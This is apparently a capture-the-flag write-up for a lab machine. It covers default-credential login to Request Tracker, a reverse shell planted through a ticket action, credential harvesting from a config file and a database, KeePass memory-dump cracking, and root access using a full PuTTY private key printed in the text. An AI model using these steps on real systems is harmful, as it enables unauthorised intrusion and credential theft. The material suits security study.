## Port scan

```
Open 10.129.229.41:22
Open 10.129.229.41:80
```

## Port 80

visited the website

![](pics/Pasted%20image%2020260913100201.png)

Searched for known CVE nothing, so I searched for the default password

![](pics/Pasted%20image%2020260913101230.png)

```
root
password
```

Now I am the root

![](pics/Pasted%20image%2020260913101250.png)

Found users

![](pics/Pasted%20image%2020260913101704.png)

Found a ticket about a problem in keepass

![](pics/Pasted%20image%2020260913102244.png)

## Initial foothold

Created a script in perl using reverse shell generator
![](pics/Pasted%20image%2020260913111208.png)

Pasted the shell on the action textbox 

![](pics/Pasted%20image%2020260913110932.png)

Since I put the condition to on create, I went ahead and created a simple ticket

![](pics/Pasted%20image%2020260913111117.png)

Now I should get a shell

![](pics/Pasted%20image%2020260913111137.png)

## PrivEsc to lnorgaard

Running linepeas

![](pics/Pasted%20image%2020260913111653.png)

### Things I found worth noting

```
Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 860, cookie 0x4, schema 4, UTF-8, version-valid-for 5

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
```

```
╔══════════╣ Mails (limit 50) (T1114.001)
     3877      8 -rw-------   1 www-data mail         4632 May 24  2023 /var/mail/www-data
     3876      4 -rw-------   1 lnorgaard mail         2649 May 24  2023 /var/mail/lnorgaard
     1476     12 -rw-------   1 root      mail        12205 Sep 13 10:18 /var/mail/root
     3877      8 -rw-------   1 www-data  mail         4632 May 24  2023 /var/spool/mail/www-data
     3876      4 -rw-------   1 lnorgaard mail         2649 May 24  2023 /var/spool/mail/lnorgaard
     1476     12 -rw-------   1 root      mail        12205 Sep 13 10:18 /var/spool/mail/root
```

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable (T1083)
-rw-r----- 1 root www-data 260 May 23  2023 /etc/request-tracker4/RT_SiteConfig.d/50-debconf.pm
-rw-r----- 1 root www-data 623 May 23  2023 /etc/request-tracker4/RT_SiteConfig.d/51-dbconfig-common.pm

```

### Found mariaDB creds

Found RT database password

![](pics/Pasted%20image%2020260913115447.png)

```
Set($DatabaseUser , 'rtuser');
Set($DatabasePassword , 'x7UiXkF55nnfC0h');
```

### Login to mariaDB
Connecting to the DB locally using mysql

```bash
mysql -u rtuser -p
<When prompted enter password> -> x7UiXkF55nnfC0h
```

![](pics/Pasted%20image%2020260913115750.png)

### Dump DBs

```sql
SHOW DATABASES;
```

![](pics/Pasted%20image%2020260913115915.png)

### Dump rtdb Tables

```
SHOW TABLES;
```

![](pics/Pasted%20image%2020260913120032.png)


### Dumping the Users table

I dumped the whole table of users at first and found out the the hash used is bcrypt so there is probably low chance of brute-force but there is comment section. Leaking the user `lnorgaard` password

So I dumped `lnorgaard` creds and comments

```
select Name,Password, Comments from Users
```

![](pics/Pasted%20image%2020260913120349.png)

```
user: lnorgaard

password: !bcrypt!12!n9Qqt2yiA0VXneZeatIRMOVvdwJdB6waOIbrwEuEtn1WwpkMEj9YS

COMMENT: New user. Initial password set to Welcome2023!
```

Now lets try this on ssh

```bash
ssh lnorgaard@10.129.229.41
```

Well, we are IN

![](pics/Pasted%20image%2020260913120723.png)

## Flag 1

![](pics/Pasted%20image%2020260913120806.png)

## PrivEsc to root

### Transfer the file to my local machine

First things I am doing is download the zip file that is mentioned on the ticket of the `keepass` for investigation

```bash
scp lnorgaard@10.129.229.41:/home/lnorgaard/RT30000.zip .
```

![](pics/Pasted%20image%2020260913121029.png)

We have these files

![](pics/Pasted%20image%2020260913121114.png)

The password databases is protected with a password

![](pics/Pasted%20image%2020260913121223.png)

So lets look at the dump file maybe there is a password leaking but before that lets start a hashcat cracking session while we investigate. First extract the hash.

### Cracking the keepass DB

![](pics/Pasted%20image%2020260913121437.png)

Now lets use it to crack the password. Found the hash type

![](pics/Pasted%20image%2020260913121630.png)

Using hashcat

```bash
hashcat -m 29700 passcodes.hash /usr/share/wordlists/rockyou.txt
```

I faced a problem in hashcat so a changed to john

```bash
john passcodes.hash --wordlist=/usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt
```

![](pics/Pasted%20image%2020260913132613.png)
### Looking into the keepass dump

I faced keepass storage format so I searched for it in the memory dump

```bash
cat strings_keepas_dump.txt | grep "<Key>Password</Key>" -A 1
```

![](pics/Pasted%20image%2020260913132714.png)

```
<Key>Password</Key>
	<Value Protected="True">8rYLyVg=</Value>
<Key>Password</Key>
	<Value Protected="True">5X1Ot0jv7Gc=</Value>
```

Lets try those with ssh on the root, both failed

![](pics/Pasted%20image%2020260913133107.png)

Also tried them on the keepass db

![](pics/Pasted%20image%2020260913133228.png)

![](pics/Pasted%20image%2020260913133258.png)

### Dumping the master key

Since these passwords are protected in memory, I used this tool called keepass memory extractor, that extract the master key for the database file

```bash
keepass-dump-extractor KeePassDumpFull.dmp -f all
```

![](pics/Pasted%20image%2020260913134120.png)

These are possible master keys lets put them in a wordlist and try to brute again

```bash
john --wordlist=master_key_wordlist.txt passcodes.hash
```

![](pics/Pasted%20image%2020260913134245.png)

### Exporting the DB contents

That is it, now using that key we can export the database to `.txt` file 

```bash
keepassxc-cli export passcodes.kdbx > passwords.txt
```

![](pics/Pasted%20image%2020260913134537.png)

### Looking for Creds

While digging into the passwords I found a Putty rsa key for username `root`

```
<Key>UserName</Key>
	<Value>root</Value>
<Key>Notes</Key>
	<Value>
		PuTTY-User-Key-File-3: ssh-rsa
		Encryption: none
		Comment: rsa-key-20230519
		Public-Lines: 6
		AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
		8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
		EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
		Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
		FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
		LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
		Private-Lines: 14
		AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
		oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
		kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
		f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
		VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
		UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
		OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
		in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
		SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
		09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
		xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
		AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
		AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
		NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
		Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
	</Value>
```

### Converting the found putty key to openssh

I pasted the putty key into a file then using putty to convert this to openssh key format

```bash
puttygen putty_ssh.ppk -O private-openssh -o root_rsa_key 
```

![](pics/Pasted%20image%2020260913140359.png)

Using the key to login via SSH

```bash
ssh root@10.129.229.41 -i root_rsa_key
```

## Flag 2

![](pics/Pasted%20image%2020260913140436.png)

![](pics/Pasted%20image%2020260913140452.png)

Done.


